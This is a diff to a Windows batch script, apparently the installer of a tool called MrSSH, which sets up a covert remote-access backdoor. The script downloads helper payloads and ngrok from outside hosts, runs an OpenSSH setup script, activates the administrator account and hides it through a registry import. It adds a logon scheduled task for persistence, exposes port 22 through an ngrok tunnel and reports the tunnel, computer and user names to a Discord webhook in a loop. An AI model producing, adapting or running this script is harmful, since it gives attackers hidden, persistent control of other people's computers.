@@ -1,28 +1,41 @@
 @echo off
 setlocal enabledelayedexpansion
-cd %temp%
+pushd %temp%
+
+:: <Variables>
+set "Version=1.0"
+set "DefaultToken=dheb"
+set Files=Hex.bat NgrokRun.bat OpenSSH.ps1 SilentCMD.exe Source.bat hide.reg WebParse.exe
+set Github=https://github.com/dh3b/MrSSH/raw/main/Files/
+set "Folder=%temp%\Files"
+:: </Variables>
 
 :: <Install>
-curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/OpenSSH.ps1" -o "OpenSSH.ps1"
-curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/Source.bat" -o "source.bat"
-curl -Ls "https://github.com/dh3b/MrSSH/blob/main/Files/SilentCMD.exe?raw=true" -o "SilentCMD.exe"
-curl -Ls "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip" -o "ngrok.zip"
-curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/NgrokRun.bat" -o "NgrokRun.bat"
-curl -Ls "https://github.com/dh3b/MrSSH/raw/main/Files/WebParse.exe?raw=true" -o "WebParse.exe"
-curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/Hex.bat" -o "Hex.bat"
-curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/hide.reg" -o "hide.reg"
+Rem download ngrok anyway, because it often bugs
+curl -Ls "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip" -o "!Folder!\ngrok.zip"
+
+for %%a in (!Files!) do if not exist "!temp!\Files\%%a" set /a MissingFiles+=1
+
+if !MissingFiles! geq 1 (
+    for %%a in (!Files!) do (
+        set /a Downloaded+=1
+        curl --create-dirs -f#kLo "!temp!\Files\%%a" "!DefaultGateway!/%%a"
+    )
+)
+
+pushd !Files!
 :: </Install>
 
 powershell ./OpenSSH.ps1
 
 net user administrator /active:yes
-reg import "%temp%\hide.reg"
+reg import "!Folder!\hide.reg"
 
 :: <Startup>
 mkdir %appdata%\MrSSH
-cd %appdata%\MrSSH & curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/onlogon.bat" -o "onlogon.bat" & curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/Silentlog.vbs" -o "Silent.vbs"
+pushd %appdata%\MrSSH & curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/onlogon.bat" -o "onlogon.bat" & curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/Silentlog.vbs" -o "Silent.vbs"
 schtasks /create /tn "MrSSH" /sc onlogon /tr "%appdata%\MrSSH\Silent.vbs" /F
-cd %temp%
+pushd !Files!
 :: </Startup>
 
 :: <Set webhook>
@@ -42,16 +55,16 @@ mkdir log
 tar -xf ngrok.zip
 
 :: <Start Ngrok>
-start /B "copy" silentcmd xcopy /h /Y ngrok.log %temp%\log\ /DELAY:10
-start /B "discordmsg" silentcmd %temp%\NgrokRun.bat /DELAY:10
+start /B "copy" silentcmd xcopy /h /Y ngrok.log !Files!\log\ /DELAY:10
+start /B "discordmsg" silentcmd !Files!\NgrokRun.bat /DELAY:10
 start /B "ngrok" taskkill /IM ngrok.exe /F & ngrok.exe tcp 22 -log=stdout > ngrok.log & timeout 14400
 :: </Start Ngrok>
 
 :: <Restart Loop>
 :ngrokloop
 call source.bat +silent --embed "Renewing the MrSSH session for %computername%\%username% (%local%)..." " " "52bf90" "https://i.imgur.com/b2Terft.png"
-start /B "copy" silentcmd xcopy /h /Y ngrok.log %temp%\log\ /DELAY:10
-start /B "discordmsg" silentcmd NgrokRun.bat /DELAY:10
+start /B "copy" silentcmd xcopy /h /Y ngrok.log !Files!\log\ /DELAY:10
+start /B "discordmsg" silentcmd !Files!\NgrokRun.bat /DELAY:10
 start /B "ngrok" taskkill /IM ngrok.exe /F & ngrok.exe tcp 22 -log=stdout > ngrok.log & timeout 14400
 goto ngrokloop
 :: </Restart Loop>
